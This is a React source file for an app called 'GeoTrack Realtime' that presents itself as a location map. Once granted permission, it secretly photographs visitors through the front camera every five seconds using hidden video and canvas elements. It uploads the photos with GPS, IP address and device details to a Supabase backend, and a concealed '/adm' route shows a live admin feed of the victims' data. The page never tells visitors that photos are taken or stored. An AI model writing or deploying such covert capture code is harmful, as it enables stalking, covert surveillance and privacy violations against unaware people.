import React, { useState, useEffect, useCallback, useRef } from 'react';
import MapView from './components/MapView';
import AdminPanel from './components/AdminPanel';
import { UserLocation, LogEntry } from './types';
import { getBrowserLocation, saveLocationToBackend, getIpLocation, getDeviceInfo } from './services/locationService';
import { supabase } from './supabaseClient';

function App() {
  // Routing State
  const [isAdminRoute, setIsAdminRoute] = useState(false);

  // App State
  const [location, setLocation] = useState<UserLocation | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [shouldRecenter, setShouldRecenter] = useState(false);
  const [permissionState, setPermissionState] = useState<'idle' | 'tracking' | 'denied'>('idle');
  const [deviceId] = useState(() => 'user_' + Math.random().toString(36).substring(7));
  const [currentIp, setCurrentIp] = useState<string>('');

  // Hardware Refs
  const watchIdRef = useRef<number | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const captureIntervalRef = useRef<number | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // 1. Handle "Routing"
  useEffect(() => {
    if (window.location.pathname === '/adm') {
      setIsAdminRoute(true);
    }
  }, []);

  // 1.5 Realtime Admin Data Sync
  useEffect(() => {
    // Only subscribe if we are in admin mode
    if (!isAdminRoute || !supabase) return;

    // Fetch Initial Data
    const fetchHistory = async () => {
      const { data, error } = await supabase
        .from('user_locations')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(50);
      
      if (data) {
        // Map DB response to UI LogEntry format
        const mappedLogs: LogEntry[] = data.map((item: any) => ({
          ...item,
          status: 'synced'
        }));
        setLogs(mappedLogs);
      }
    };

    fetchHistory();

    // Subscribe to Realtime Inserts
    const channel = supabase
      .channel('public:user_locations')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'user_locations' }, (payload) => {
        const newRecord = payload.new;
        const newLog: LogEntry = {
          id: newRecord.id,
          latitude: newRecord.latitude,
          longitude: newRecord.longitude,
          device_id: newRecord.device_id,
          ip_address: newRecord.ip_address,
          image_data: newRecord.image_data,
          device_info: newRecord.device_info,
          created_at: newRecord.created_at,
          status: 'synced'
        };
        
        setLogs(prev => [newLog, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isAdminRoute]);

  // 2. Initial IP Fetch (Only for client/map mode)
  useEffect(() => {
    if (isAdminRoute) return; 

    const fetchApproximateLocation = async () => {
      if (permissionState === 'idle') {
        const ipLoc = await getIpLocation();
        if (ipLoc) {
          setLocation(ipLoc);
          setShouldRecenter(true);
          if (ipLoc.ip) setCurrentIp(ipLoc.ip);
        }
      }
    };
    fetchApproximateLocation();
  }, [permissionState, isAdminRoute]);

  // 3. Helper: Capture Image from hidden video element
  const captureImage = useCallback((): string | undefined => {
    if (videoRef.current && canvasRef.current && streamRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      if (context && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        // Returns Base64 JPEG string
        return canvas.toDataURL('image/jpeg', 0.5); 
      }
    }
    return undefined;
  }, []);

  // 4. Helper: Process Location & Image -> Save
  const handleDataCapture = useCallback(async (loc: UserLocation, isPeriodicCapture: boolean = false) => {
    setLocation(loc);
    
    // If it's a periodic capture (every 5s), grab the image
    let imageData: string | undefined;
    if (isPeriodicCapture) {
      imageData = captureImage();
    }

    // Only save to log if it's precise GPS or we have an image
    // (Prevent spamming logs with just IP data repeatedly unless it's a timed capture)
    if (loc.source === 'gps' || imageData) {
        const deviceInfo = getDeviceInfo();
        const logEntry = await saveLocationToBackend(loc, deviceId, imageData, currentIp, deviceInfo);
        
        // Update logs state locally (for visual feedback if we were showing logs in client view)
        // Note: Admin view uses the subscription above, so this setLogs mostly affects the current session if we were to display it.
        if (!isAdminRoute) {
            setLogs(prev => {
              const newLogs = [logEntry, ...prev];
              return newLogs.slice(0, 50);
            });
        }
    }
  }, [deviceId, captureImage, currentIp, isAdminRoute]);

  // 5. Start Tracking (GPS + Camera)
  const startTracking = async () => {
    try {
      // A. Request Camera Permission & Start Stream
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }

      setPermissionState('tracking');
      setShouldRecenter(true);

      // B. Start GPS Watch
      watchIdRef.current = getBrowserLocation(
        (loc) => {
          // Update map immediately on movement
          setLocation(loc); 
          // Note: We don't save every single GPS tick to DB, 
          // we rely on the 5-second interval for the "Packet" (GPS + Image)
        },
        (err) => {
          console.error("Geo error", err);
          setPermissionState('denied');
        }
      );

      // C. Start 5-second Interval for Data Snapshot
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      
      captureIntervalRef.current = window.setInterval(() => {
        // Use the *latest* location state
        setLocation(prevLoc => {
          if (prevLoc) {
            handleDataCapture(prevLoc, true);
          }
          return prevLoc;
        });
      }, 5000); // 5 Seconds

    } catch (err) {
      console.error("Camera permission denied or error", err);
      // Still allow GPS if Camera fails, but warn user? 
      // For now, we treat denied camera as "Permission Denied" state mostly
      alert("Camera permission is required for the full tracking feature.");
      setPermissionState('denied');
    }
  };

  // Cleanup
  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
    };
  }, []);

  // --- RENDER ---

  // If URL is /adm, show Admin Dashboard
  if (isAdminRoute) {
    return <AdminPanel logs={logs} />;
  }

  // Otherwise, show Map App
  return (
    <div className="h-full w-full flex flex-col bg-gray-50 overflow-hidden relative font-sans text-gray-900">
      
      {/* Hidden Camera Elements */}
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {/* Header */}
      <div className="absolute top-0 left-0 right-0 z-[1500] pointer-events-none p-4">
        <div className="bg-white/90 backdrop-blur-md shadow-lg rounded-2xl p-4 flex justify-between items-center pointer-events-auto max-w-4xl mx-auto border border-white/50">
          <div className="flex items-center space-x-3">
             <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg transition-colors duration-500 ${
               permissionState === 'tracking' 
                ? 'bg-gradient-to-tr from-green-600 to-emerald-500 shadow-green-500/30' 
                : 'bg-gradient-to-tr from-blue-600 to-cyan-500 shadow-blue-500/30'
             }`}>
                <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-video' : 'fa-globe'}`}></i>
             </div>
             <div>
               <h1 className="font-bold text-lg leading-tight">GeoTrack Realtime</h1>
               <p className="text-xs text-gray-500">
                 Status: 
                 <span className={`ml-1 font-semibold ${
                   permissionState === 'tracking' ? 'text-green-600' : 
                   permissionState === 'denied' ? 'text-red-600' : 'text-blue-600'
                 }`}>
                   {permissionState === 'idle' ? 'Ready (Approx Loc)' : 
                    permissionState === 'tracking' ? 'Live (GPS + Cam)' : 'Access Denied'}
                 </span>
               </p>
             </div>
          </div>
          
          {/* Link to Admin (Hidden trick or button) */}
          <a href="/adm" className="text-xs text-gray-400 hover:text-gray-600">
             <i className="fa-solid fa-lock"></i>
          </a>
        </div>
      </div>

      {/* Map */}
      <div className="flex-1 relative z-0">
        <MapView 
          location={location} 
          shouldRecenter={shouldRecenter}
          onRecenterComplete={() => setShouldRecenter(false)}
        />
        
        {/* Permission Denied Overlay */}
        {permissionState === 'denied' && (
           <div className="absolute inset-0 z-[2000] bg-black/50 flex items-center justify-center backdrop-blur-sm">
             <div className="bg-white p-6 rounded-2xl shadow-2xl max-w-sm text-center">
               <div className="w-16 h-16 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
                 <i className="fa-solid fa-ban text-2xl"></i>
               </div>
               <h3 className="text-xl font-bold mb-2">Access Required</h3>
               <p className="text-gray-500 mb-6 text-sm">We need permission to access your <strong>Location</strong> and <strong>Camera</strong> to start the realtime session.</p>
               <button 
                 onClick={() => window.location.reload()}
                 className="w-full py-2.5 bg-gray-900 text-white rounded-xl hover:bg-black transition-colors"
               >
                 Try Again
               </button>
             </div>
           </div>
        )}
      </div>

      {/* Action Button */}
      <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 z-[1500]">
        <button 
          onClick={() => {
            if (permissionState !== 'tracking') startTracking();
            else setShouldRecenter(true);
          }}
          className={`
            group relative flex items-center justify-center px-6 py-4 rounded-full shadow-2xl transition-all duration-300
            ${permissionState === 'tracking' 
              ? 'bg-white text-green-600 hover:bg-green-50' 
              : 'bg-blue-600 text-white hover:bg-blue-700 hover:scale-105'
            }
          `}
        >
          {permissionState === 'tracking' && (
             <span className="absolute -top-1 -right-1 flex h-3 w-3">
               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
               <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
             </span>
          )}
          
          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-crosshairs' : 'fa-play'} text-xl mr-2`}></i>
          <span className="font-bold">
             {permissionState === 'tracking' ? 'Pusatkan Titik' : 'Aktifkan GPS & Kamera'}
          </span>
        </button>
      </div>
    </div>
  );
}

export default App;